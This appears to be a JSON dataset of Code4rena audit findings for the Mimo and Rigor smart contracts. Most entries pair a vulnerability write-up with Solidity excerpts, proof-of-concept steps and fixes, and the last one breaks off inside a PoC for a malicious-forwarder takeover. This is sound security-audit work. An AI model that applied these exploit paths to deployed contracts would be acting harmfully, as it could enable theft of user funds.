[{"title": "`vaultOwner` Can Front-Run `rebalance()` With `setAutomation()` To Lower Incentives ", "html_url": "https://github.com/code-423n4/2022-08-mimo-findings/issues/134", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-mimo-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-mimo/blob/main/contracts/actions/automated/MIMOAutoAction.sol#L32 https://github.com/code-423n4/2022-08-mimo/blob/main/contracts/actions/automated/MIMOAutoRebalance.sol#L54   # Vulnerability details  ## Impact A `vaultOwner` who is \"not confident enough in ourselves to stay up-to-date with market conditions to know when we should move to less volatile collateral to avoid liquidations.\" They can open their vault to other users who pay attention to the markets and would call `rebalance` to recieve the insentivized fees. The `vaultOwner` who doesn't want to pay the baiting high fees instead front-runs the `autoRebalance()` with `setAutomation()` to lower incentives.  ## Proof of Concept 1. A Mallory a `vaultOwner` isn't confident in staying up-to-date with market conditions. She has her vault setup to be automated and has high fee incentives.  2. Alice a user who is confident in staying up-to-date with market conditions see's a profitable opportunity and calls `rebalance()`. 3. Mallory is confident in her programing and watching mempools for when `rebalance()` is called. See's that Alice just called `rebalance()` and calls `setAutomation()` to lower the incentives.  4. Alice's call to `rebalance()` then goes through getting lower incentives and Mallory then calls `setAutomation()` to set the incentives back to normal.  ## Tools Used Manual Review  ## Recommended Mitigation Steps Add a time-lock to `setAutomation` so that the `vaultOwner` can't front-run users."}, {"title": "ProxyFactory can circumvent ProxyRegistry", "html_url": "https://github.com/code-423n4/2022-08-mimo-findings/issues/123", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-mimo-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxyFactory.sol#L45   # Vulnerability details  ## Impact The `deployFor()` function in `MIMOProxyFactory.sol` can be called directly instead of being called within `MIMOProxyRegistry.sol`. This results in the ability to create many MIMOProxies that are not registered within the registry. The proxies deployed directly through the factory will lack the ability to call certain actions such as leveraging and emptying the vault, but will be able to call all functions in `MIMOVaultAction.sol`.  This inconsistency doesn't feel natural and would be remedied by adding an `onlyRegistry` modifier to the `ProxyFactory.deployFor()` function.  ## Proof of Concept `MIMOProxyFactory.deployFor()` lacking any access control: ```   function deployFor(address owner) public override returns (IMIMOProxy proxy) {     proxy = IMIMOProxy(mimoProxyBase.clone());     proxy.initialize();       // Transfer the ownership from this factory contract to the specified owner.     proxy.transferOwnership(owner);       // Mark the proxy as deployed.     _proxies[address(proxy)] = true;       // Log the proxy via en event.     emit DeployProxy(msg.sender, owner, address(proxy));   } } ```  Example of reduced functionality: `MIMOEmptyVault.executeOperation()` checks proxy existence in the proxy registry therefore can't be called. ```   function executeOperation(     address[] calldata assets,     uint256[] calldata amounts,     uint256[] calldata premiums,     address initiator,     bytes calldata params   ) external override returns (bool) {     (address owner, uint256 vaultId, SwapData memory swapData) = abi.decode(params, (address, uint256, SwapData));     IMIMOProxy mimoProxy = IMIMOProxy(proxyRegistry.getCurrentProxy(owner)); ```  ## Tools Used Manual review.  ## Recommended Mitigation Steps Adding access control to ensure that the factory deployFor function is called from the proxy registry would mitigate this issue."}, {"title": "Registry.sol works bad - it fails to delivere expected functionality", "html_url": "https://github.com/code-423n4/2022-08-mimo-findings/issues/78", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-08-mimo-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxyFactory.sol#L40-L58 https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxyRegistry.sol#L39-L59   # Vulnerability details  ## Impact The description of Registry.sol is following: /// Deploys new proxies via the factory and keeps a registry of owners to proxies. Owners can only /// have one proxy at a time. But it is not. There are multiple problems: 1) Proxy owner can change and will not be registered 2) There many ways for an owner to have many proxies: - a few other proxy owners transfeOwnership() to one address - Registry tracks last deployments and does not guarantee ownership - Factory.sol allows calling deployFor() to anyone, without any checks and registrations  ## Proof of Concept https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxyFactory.sol#L40-L58 https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxyRegistry.sol#L39-L59  ## Tools Used Hardhat  ## Recommended Mitigation Steps Delete Proxy.transfetOwnership() Disallow anyone to call deploy() and deployFor() in Factory()"}, {"title": "Automation / management can be set for not yet existing vault", "html_url": "https://github.com/code-423n4/2022-08-mimo-findings/issues/68", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-08-mimo-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-mimo/blob/9adf46f2efc61898247c719f2f948b41d5d62bbe/contracts/actions/automated/MIMOAutoAction.sol#L33 https://github.com/code-423n4/2022-08-mimo/blob/9adf46f2efc61898247c719f2f948b41d5d62bbe/contracts/actions/managed/MIMOManagedAction.sol#L35   # Vulnerability details  ## Impact & Proof Of Concept `vaultOwner` returns zero for a non-existing `vaultId`. Similarly, `proxyRegistry.getCurrentProxy(msg.sender)` returns zero when `msg.sender` has not deployed a proxy yet. Those two facts can be combined to set automation for a vault ID that does not exist yet. When this is done by a user without a proxy, it will succeed, as both `vaultOwner` and `mimoProxy` are `address(0)`, i.e. we have `vaultOwner == mimoProxy`.  The consequences of this are quite severe. As soon as the vault is created, it will be an automated vault (with potentially very high fees). An attacker can exploit this by setting very high fees before the creation of the vault and then performing actions for the automated vault, which leads to a loss of funds for the user.  The same attack is possible for `setManagement`.  ## Recommended Mitigation Steps Do not allow setting automation parameters for non-existing vaults, i.e. check that `vaultOwner != address(0)`."}, {"title": "MIMOManagedRebalance.sol#rebalance calculates managerFee incorrectly", "html_url": "https://github.com/code-423n4/2022-08-mimo-findings/issues/34", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-mimo-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/actions/managed/MIMOManagedRebalance.sol#L50-L80   # Vulnerability details  ## Impact Inconsistent manager fees could lead to lack of incentivization to rebalance and unexpected liquidation.  ## Proof of Concept      uint256 managerFee = managedVault.fixedFee + flData.amount.wadMul(managedVault.varFee);      IERC20(a.stablex()).safeTransfer(managedVault.manager, managerFee);  The variable portion of the fee is calculated using the amount of the flashloan but pays out in PAR. This is problematic because the value of the flashloan asset is constantly fluctuating in value against PAR. This results in an unpredictable fee for both the user and the manager. If the asset drops in price then the user will pay more than they intended. If the asset increases in price then the fee may not be enough to incentivize the manager to call them. The purpose of the managed rebalance is limit user interaction. If the manager isn't incentivized to call the vault then the user may be unexpectedly liquidated, resulting in loss of user funds.    ## Tools Used  ## Recommended Mitigation Steps  varFee should be calculated against the PAR of the rebalance like it is in MIMOAutoRebalance.sol:      IPriceFeed priceFeed = a.priceFeed();     address fromCollateral = vaultsData.vaultCollateralType(rbData.vaultId);      uint256 rebalanceValue = priceFeed.convertFrom(fromCollateral, flData.amount);     uint256 managerFee = managedVault.fixedFee + rebalanceValue.wadMul(managedVault.varFee);"}, {"title": "MIMOEmptyVault.sol executeOperation() does not transfer the Vault leftover assets to the owner, it is locked in the MIMOEmptyVault", "html_url": "https://github.com/code-423n4/2022-08-mimo-findings/issues/18", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-08-mimo-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/actions/MIMOEmptyVault.sol#L96-L100   # Vulnerability details  ## Impact MIMOEmptyVault.sol executeAction() is supposed to pay off the debt and return the leftover assets to the owner of the Vault But In fact the emptyVault contract, after executing the executionOperation(), only pays back the flash loan, and does not transfer the leftover assets to the owner, and locked in the emptyVault contract  ## Proof of Concept ```   function executeOperation(     address[] calldata assets,     uint256[] calldata amounts,     uint256[] calldata premiums,     address initiator,     bytes calldata params   ) external override returns (bool) {      ....     ....      require(flashloanRepayAmount <= vaultCollateral.balanceOf(address(this)), Errors.CANNOT_REPAY_FLASHLOAN);      vaultCollateral.safeIncreaseAllowance(address(lendingPool), flashloanRepayAmount);      //****Paid off the flash loan but did not transfer the remaining balance back to mimoProxy or owner ***//      return true;   }  ```  Add logs to test case   test/02_integration/MIMOEmtpyVault.test.ts  ```   it(\"should be able to empty vault with 1inch\", async () => {   ...   ...   ...   ++++ console.log(\"before emptyVault balance:--->\", (await wmatic.balanceOf(emptyVault.address)) + \"\");     const tx = await mimoProxy.execute(emptyVault.address, MIMOProxyData);     const receipt = await tx.wait(1);   ++++ console.log(\"after emptyVault balance: --->\", (await wmatic.balanceOf(emptyVault.address)) + \"\");    ```  print: ``` before emptyVault balance:---> 0 after emptyVault balance: ---> 44383268870065355782  ```  ## Tools Used  ## Recommended Mitigation Steps  ```   function executeOperation(     address[] calldata assets,     uint256[] calldata amounts,     uint256[] calldata premiums,     address initiator,     bytes calldata params   ) external override returns (bool) {      ....     ....      require(flashloanRepayAmount <= vaultCollateral.balanceOf(address(this)), Errors.CANNOT_REPAY_FLASHLOAN);      vaultCollateral.safeIncreaseAllowance(address(lendingPool), flashloanRepayAmount);      //****transfer the remaining balance back to mimoProxy or owner ***//     ++++ vaultCollateral.safeTransfer(address(mimoProxy), vaultCollateral.balanceOf(address(this)) - flashloanRepayAmount);      return true;   }  ``` "}, {"title": "Missing upper limit definition in replaceLenderFee() of HomeFi.sol", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/400", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "valid"], "target": "2022-08-rigor-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/Community.sol#L392-L394 https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/HomeFi.sol#L184-L197   # Vulnerability details  # Missing upper limit definition in `replaceLenderFee()` of `HomeFi.sol`  ## Impact The admin of the `HomeFi` contract can set `lenderFee` to greater than 100%, forcing calls to `lendToProject()` to all projects created in the future to revert.  ## Proof of Concept Using the function `replaceLenderFee()`, admins of the `HomeFi` contract can set `lenderFee` to any arbitrary `uint256` value: ```solidity  185:        function replaceLenderFee(uint256 _newLenderFee)  186:            external  187:            override  188:            onlyAdmin  189:        {  190:            // Revert if no change in lender fee  191:            require(lenderFee != _newLenderFee, \"HomeFi::!Change\");  192:      193:            // Reset variables  194:            lenderFee = _newLenderFee;  195:      196:            emit LenderFeeReplaced(_newLenderFee);  197:        } ```  New projects that are created will then get its `lenderFee` from the `HomeFi` contract. When communities wish to lend to these projects, it calls `lendToProject()`, which has the following calculation: ```solidity  392:        // Calculate lenderFee  393:        uint256 _lenderFee = (_lendingAmount * _projectInstance.lenderFee()) /  394:            (_projectInstance.lenderFee() + 1000); ``` If `lenderFee` a large value, such as `type(uint256).max`, the calculation shown above to overflow. This prevents any community from lending to any new projects.   ## Recommended Mitigation Steps Consider adding a reasonable fee rate bounds checks in the `replaceLenderFee()` function. This would prevent potential griefing and increase the trust of users in the contract."}, {"title": "New subcontractor can be set for a SCConfirmed task without current subcontractor consent", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/378", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed", "old-submission-method", "valid"], "target": "2022-08-rigor-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L295-L316   # Vulnerability details  Malicious builder/contractor can change the subcontractor for any task even if all the terms was agreed upon and work was started/finished, but the task wasn't set to completed yet, i.e. it's `SCConfirmed`, `getAlerts(_taskID)[2] == true`. This condition is not checked by inviteSC().  For example, a contractor can create a subcontractor of her own and front run valid setComplete() call with a sequence of `inviteSC(task, own_subcontractor) -> setComplete()` with a signatory from the `own_subcontractor`, stealing the task budget from the subcontractor who did the job. Contractor will not breach any duties with the community as the task will be done, while raiseDispute() will not work for a real subcontractor as the task record will be already changed.  Setting the severity to be high as this creates an attack vector to fully steal task budget from the subcontractor as at the moment of any valid setComplete() call the task budget belongs to subcontractor as the job completion is already verified by all the parties.  ## Proof of Concept  inviteSC() requires either builder or contractor to call for the change and verify nothing else:  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L295-L316  ```solidity     /// @inheritdoc IProject     function inviteSC(uint256[] calldata _taskList, address[] calldata _scList)         external         override     {         // Revert if sender is neither builder nor contractor.         require(             _msgSender() == builder || _msgSender() == contractor,             \"Project::!Builder||!GC\"         );          // Revert if taskList array length not equal to scList array length.         uint256 _length = _taskList.length;         require(_length == _scList.length, \"Project::Lengths !match\");          // Invite subcontractor for each task.         for (uint256 i = 0; i < _length; i++) {             _inviteSC(_taskList[i], _scList[i], false);         }          emit MultipleSCInvited(_taskList, _scList);     } ```  _inviteSC() only checks non-zero address and calls inviteSubcontractor():  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L747-L762  ```solidity     function _inviteSC(         uint256 _taskID,         address _sc,         bool _emitEvent     ) internal {         // Revert if sc to invite is address 0         require(_sc != address(0), \"Project::0 address\");          // Internal call to tasks invite contractor         tasks[_taskID].inviteSubcontractor(_sc);          // If `_emitEvent` is true (called via changeOrder) then emit event         if (_emitEvent) {             emit SingleSCInvited(_taskID, _sc);         }     } ```  inviteSubcontractor() just sets the new value:  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/libraries/Tasks.sol#L106-L111  ```solidity     function inviteSubcontractor(Task storage _self, address _sc)         internal         onlyInactive(_self)     {         _self.subcontractor = _sc;     } ```  Task is paid only on completion by setComplete():  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L349-L356  ```solidity         // Mark task as complete. Only works when task is active.         tasks[_taskID].setComplete();          // Transfer funds to subcontractor.         currency.safeTransfer(             tasks[_taskID].subcontractor,             tasks[_taskID].cost         ); ```  This way the absence of `getAlerts(_taskID)[2]` check and checkSignatureTask() call in inviteSC() provides a way for builder or contractor to steal task budget from a subcontractor.   ## Recommended Mitigation Steps  Consider calling checkSignatureTask() when `getAlerts(_taskID)[2]` is true, schematically:  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L310-L313  ```solidity         // Invite subcontractor for each task.         for (uint256 i = 0; i < _length; i++) { +           if (getAlerts(_taskList[i])[2]) +               checkSignatureTask(_data_with_scList[i], _signature, _taskList[i]);                     _inviteSC(_taskList[i], _scList[i], false);         } ```  This approach is already implemented in changeOrder() where `_newSC` is a part of hash that has to be signed by all the parties:  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L386-L403  ```solidity     function changeOrder(bytes calldata _data, bytes calldata _signature)         external         override         nonReentrant     {         // Decode params from _data         (             uint256 _taskID,             address _newSC,             uint256 _newCost,             address _project         ) = abi.decode(_data, (uint256, address, uint256, address));          // If the sender is disputes contract, then do not check for signatures.         if (_msgSender() != disputes) {             // Check for required signatures.             checkSignatureTask(_data, _signature, _taskID);         } ```  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L477-L481  ```solidity             // If new subcontractor is not zero address.             if (_newSC != address(0)) {                 // Invite the new subcontractor for the task.                 _inviteSC(_taskID, _newSC, true);             } ```  checkSignatureTask() checks all the signatures:  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L855-L861  ```solidity             // When builder has not delegated rights to contractor             else {                 // Check for B, SC and GC signatures                 checkSignatureValidity(builder, _hash, _signature, 0);                 checkSignatureValidity(contractor, _hash, _signature, 1);                 checkSignatureValidity(_sc, _hash, _signature, 2);             } ```  "}, {"title": "updateProjectHash does not check project address", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/347", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "valid"], "target": "2022-08-rigor-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L162   # Vulnerability details  In Project.sol, function `updateProjectHash` L162, `_data` (which is signed by builder and/or contractor) does not contain a reference to the project address. In all other external functions of Project.sol, `_data` contains the address of the project, used in this check:  ```require(_projectAddress == address(this), \"Project::!projectAddress\");```. The lack of this verification makes it possible to reuse the same `_data`, and the same `_signature` on another project, in the case the latter has the same builder and/or contractor, and the same `_nonce`. In pratice, if the same group of people starts a new project, when `_nonce` reaches the correct value, anyone can change the hash of a task (if we suppose that that `updateTaskHash()` was used in the previous project)."}, {"title": "`Project.raiseDispute()` doesn't use approvedHashes - meaning users who use contracts can't raise disputes", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/340", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "valid"], "target": "2022-08-rigor-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L493-L536   # Vulnerability details   ## Impact In case users are using a contract (like a multisig wallet) to interact with a project, they can't raise a dispute.  The sponsors have added the `approveHash()` function to support users who wish to use contracts as builder/GC/SC. However, the `Project.raiseDispute()` function doesn't check them, meaning if any of those users wish to raise a dispute they can't do it.  ## Proof of Concept I've modified [the following test](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/test/utils/disputeTests.ts#L179-L215), trying to use an approved hash. The test failed.  ```typescript   it('Builder can raise addTasks() dispute', async () => {       let expected = 2;       const actionValues = [         [exampleHash],         [100000000000],         expected,         projectAddress,       ];       // build and raise dispute transaction       const [encodedData, signature] = await makeDispute(         projectAddress,         0,         1,         actionValues,         signers[0],         '0x4222',       );       const encodedMsgHash = ethers.utils.keccak256(encodedData);       await project.connect(signers[0]).approveHash(encodedMsgHash);       let tx = await project         .connect(signers[1])         .raiseDispute(encodedData, \"0x\");       // expect event       await expect(tx)         .to.emit(disputesContract, 'DisputeRaised')         .withArgs(1, '0x4222');       // expect dispute raise to store info       const _dispute = await disputesContract.disputes(1);       const decodedAction = abiCoder.decode(types.taskAdd, _dispute.actionData);       expect(_dispute.status).to.be.equal(1);       expect(_dispute.taskID).to.be.equal(0);       expect(decodedAction[0][0]).to.be.equal(exampleHash);       expect(decodedAction[1][0]).to.be.equal(100000000000);       expect(decodedAction[2]).to.be.equal(expected);       expect(decodedAction[3]).to.be.equal(projectAddress);       // expect unchanged number of tasks       let taskCount = await project.taskCount();       expect(taskCount).to.be.equal(expected);     });  ```  ## Recommended Mitigation Steps Make `raiseDispute()` to check for approvedHashes too"}, {"title": "Possible DOS in `lendToProject()` and `toggleLendingNeeded()` function because unbounded loop can run out of gas", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/336", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "old-submission-method", "valid"], "target": "2022-08-rigor-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L710   # Vulnerability details  ## Impact  In `Project` contract, the `lendToProject()` function might not be available to be called if there are a lot of Task in `tasks[]` list of project. It means that the project cannot be funded by either builder or community owner.  This can happen because `lendToProject()` used `projectCost()` function. And the loop in `projectCost()` did not have a mechanism to stop, it\u2019s only based on the length `taskCount`, and may take all the gas limit. If the gas limit is reached, this transaction will fail or revert.  Same issue with `toggleLendingNeeded()` function which also call `projectCost()` function.  ## Proof of Concept  Function `projectCost()` did not have a mechanism to stop, only based on the `taskCount`. ```solidity function projectCost() public view override returns (uint256 _cost) {     // Local instance of taskCount. To save gas.     uint256 _length = taskCount;      // Iterate over all tasks to sum their cost     for (uint256 _taskID = 1; _taskID <= _length; _taskID++) {         _cost += tasks[_taskID].cost;     } } ```  There is no limit for builder when [add task](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L248-L257).  And function `lendToProject()` used `projectCost()` to [check the new total lent value](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L199-L202) ```solidity require(     projectCost() >= uint256(_newTotalLent),     \"Project::value>required\" ); ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Consider keep value of `projectCost()` in a storage variable and update it when a task is added or updated accordingly.  "}, {"title": "Anyone can create disputes if `contractor` is not set", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/327", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "valid"], "target": "2022-08-rigor-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L498-L502 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/libraries/SignatureDecoder.sol#L25   # Vulnerability details  ## Impact  Disputes enable an actor to arbitrate & potentially enforce requested state changes. However, the current implementation does not properly implement authorization, thus anyone is able to create disputes and spam the system with invalid disputes.  ## Proof of Concept  Calling the `Project.raiseDispute` function with an invalid `_signature`, for instance providing a `_signature` with a length of 66 will return `address(0)` as the recovered signer address.  [Project.raiseDispute](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L498-L502)  ```solidity function raiseDispute(bytes calldata _data, bytes calldata _signature)     external     override {     // Recover the signer from the signature     address signer = SignatureDecoder.recoverKey(         keccak256(_data),         _signature,         0     );      ...   } ```  [SignatureDecoder.sol#L25](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/libraries/SignatureDecoder.sol#L25)  ```solidity function recoverKey(   bytes32 messageHash,   bytes memory messageSignatures,   uint256 pos ) internal pure returns (address) {   if (messageSignatures.length % 65 != 0) {       return (address(0));   }    ... } ```  If `_task` is set to `0` and the project does not have a `contractor`, the `require` checks will pass and `IDisputes(disputes).raiseDispute(_data, _signature);` is called. The same applies if a specific `_task` is given and if the task has a `subcontractor`. Then the check will also pass.  [Project.raiseDispute](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Disputes.sol#L84-L122)  ```solidity function raiseDispute(bytes calldata _data, bytes calldata _signature)     external     override {     // Recover the signer from the signature     address signer = SignatureDecoder.recoverKey(         keccak256(_data),         _signature,         0     );      // Decode params from _data     (address _project, uint256 _task, , , ) = abi.decode(         _data,         (address, uint256, uint8, bytes, bytes)     );      // Revert if decoded project address does not match this contract. Indicating incorrect _data.     require(_project == address(this), \"Project::!projectAddress\");      if (_task == 0) {         // Revet if sender is not builder or contractor         require(             signer == builder || signer == contractor, // @audit-info if `contractor = address(0)` and the recovered signer is also the zero-address, this check will pass             \"Project::!(GC||Builder)\"         );     } else {         // Revet if sender is not builder, contractor or task's subcontractor         require(             signer == builder ||                 signer == contractor || // @audit-info if `contractor = address(0)` and the recovered signer is also the zero-address, this check will pass                 signer == tasks[_task].subcontractor,             \"Project::!(GC||Builder||SC)\"         );          if (signer == tasks[_task].subcontractor) {             // If sender is task's subcontractor, revert if invitation is not accepted.             require(getAlerts(_task)[2], \"Project::!SCConfirmed\");         }     }      // Make a call to Disputes contract raiseDisputes.     IDisputes(disputes).raiseDispute(_data, _signature); // @audit-info Dispute will be created. Anyone can spam the system with fake disputes } ```  ## Tools Used  Manual review  ## Recommended mitigation steps  Consider checking the recovered `signer` address in `Project.raiseDispute` to not equal the zero-address:  ```solidity function raiseDispute(bytes calldata _data, bytes calldata _signature)     external     override {     // Recover the signer from the signature     address signer = SignatureDecoder.recoverKey(         keccak256(_data),         _signature,         0     );      require(signer != address(0), \"Zero-address\"); // @audit-info Revert if signer is zero-address      ...   } ``` "}, {"title": "Add members to the not yet created community", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/298", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "old-submission-method", "valid"], "target": "2022-08-rigor-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/Community.sol#L187 https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/Community.sol#L179 https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/Community.sol#L878 https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/libraries/SignatureDecoder.sol#L39   # Vulnerability details  ## Impact There is a `addMember` function in the `Community`.  The function accepts `_data` that should be signed by the `_community.owner` and `_newMemberAddr`.   ```         // Compute hash from bytes         bytes32 _hash = keccak256(_data);          // Decode params from _data         (             uint256 _communityID,             address _newMemberAddr,             bytes memory _messageHash         ) = abi.decode(_data, (uint256, address, bytes));          CommunityStruct storage _community = _communities[_communityID];          // check signatures         checkSignatureValidity(_community.owner, _hash, _signature, 0); // must be community owner         checkSignatureValidity(_newMemberAddr, _hash, _signature, 1); // must be new member ```  The code above shows exactly what the contract logic looks like.   1) `_communityID` is taken from the data provided by user, so it can arbitrarily. Specifically,  community with selected `_communityID` can be not yet created. For instance, it can be equal to the `communityCount + 1`, thus the next created community will have this `_communityID`.   2) `_communities[_communityID]` will store null values for all fields, for a selected `_communityID`. That means, `_community.owner == address(0)`  3) `checkSignatureValidity` with a parameters `address(0), _hash, _signature, 0` will not revert a call if an attacker provide incorrect `_signature`.  let's see the implementation of `checkSignatureValidity`:  ```         // Decode signer         address _recoveredSignature = SignatureDecoder.recoverKey(             _hash,             _signature,             _signatureIndex         );          // Revert if decoded signer does not match expected address         // Or if hash is not approved by the expected address.         require(             _recoveredSignature == _address || approvedHashes[_address][_hash],             \"Community::invalid signature\"         );          // Delete from approvedHash. So that signature cannot be reused.         delete approvedHashes[_address][_hash]; ```  No restrictions on `_recoveredSignature` or `_address`. Moreover, if `SignatureDecoder.recoverKey` can return zero value, then there will be no revert.   ```        if (messageSignatures.length % 65 != 0) {             return (address(0));         }          uint8 v;         bytes32 r;         bytes32 s;         (v, r, s) = signatureSplit(messageSignatures, pos);          // If the version is correct return the signer address         if (v != 27 && v != 28) {             return (address(0));         } else {             // solium-disable-next-line arg-overflow             return ecrecover(toEthSignedMessageHash(messageHash), v, r, s);         } ```  As we can see bellow, `recoverKey` function can return zero value, if an `ecrecover` return zero value or if `v != 27 || v != 28`. Both cases are completely dependent on the input parameters to the function, namely from `signature` that is provided by attacker.  4) `checkSignatureValidity(_newMemberAddr, _hash, _signature, 1)` will not revert the call if an attacker provide correct signature in the function. It is obviously possible.  All in all, an attacker can add as many members as they want, BEFORE the `community` will be created.   ## Tools Used  ## Recommended Mitigation Steps   1) `checkSignatureValidity`/`recoverKey` should revert the call if an `address == 0`. 2) `addMember` should have a `require(_communityId <= communityCount)`  "}, {"title": "Attacker can drain all the projects within minutes, if admin account has been exposed", "html_url": "https://github.com/code-423n4/2022-08-rigor-findings/issues/264", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "valid"], "target": "2022-08-rigor-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFi.sol#L156-L169 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFi.sol#L199-L208   # Vulnerability details   ## Impact In case where the admin wallet has been hacked, the attacker can drain all funds out of the project within minutes. All the attacker needs is the admin to sign a single meta/normal tx. Even though the likelihood of the admin wallet being hacked might be low, given that the impact is critical - I think this makes it at least a medium bug.   Examples of cases where the attacker can gain access to admin wallet: * The computer which the admins are using has been hacked     * Even if a hardware wallet is used, the attacker can still replace the data sent to the wallet the next time the admin has to sign a tx (whether it's a meta or normal tx) * The website/software where the meta tx data is generated has been hacked and attacker modifies the data for tx * A malicious website tricks the admin into signing a meta tx to replace the admin or forwarder     Since the forwarder has the power to do everything in the system , once an attacker manages to replace it with a malicious forwarder, he can do whatever he wants withing minutes: * The forwarder can replace the admin * The forwarder can drain all funds from all projects by changing the subcontractor and marking tasks as complete, or adding new tasks / changing task cost as needed.  Even when signatures are required, you can bypass it by using the `approveHash` function.  ## Proof of Concept Here's a PoC for taking over and running the `Project.setComplete()` function (I haven't included a whole process of changing SC etc. since that would be too time consuming, but there shouldn't be a difference between functions, all can be impersonated once you control the forwarder).  The PoC was added to [projectTests.ts#L1109](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/test/utils/projectTests.ts#L1109), and is based on the 'should be able to complete a task' test.  ```typescript     it('PoC forwarder overtake', async () => {     const attacker = signers[10];       // deploy the malicious forwarder     const maliciousForwarder = await deploy<MaliciousForwarder>('MaliciousForwarder');     const adminAddress = await homeFiContract.admin();     const adminSigner = getSignerByAddress(signers, adminAddress);     // attacker takes over     await homeFiContract.connect(adminSigner).setTrustedForwarder(maliciousForwarder.address);            // attacker can now replace the admin, so that admin can't set the forwarder back     let { data } = await homeFiContract.populateTransaction.replaceAdmin(       attacker.address     );     let from = adminAddress;     let to = homeFiContract.address;     if (!data) {       throw Error('No data');     }     let tx = await executeMetaTX(from, to, data);      // assert that admin has been replaced by attacker     expect(await homeFiContract.admin()).to.be.eq(attacker.address);      // attacker can now execute 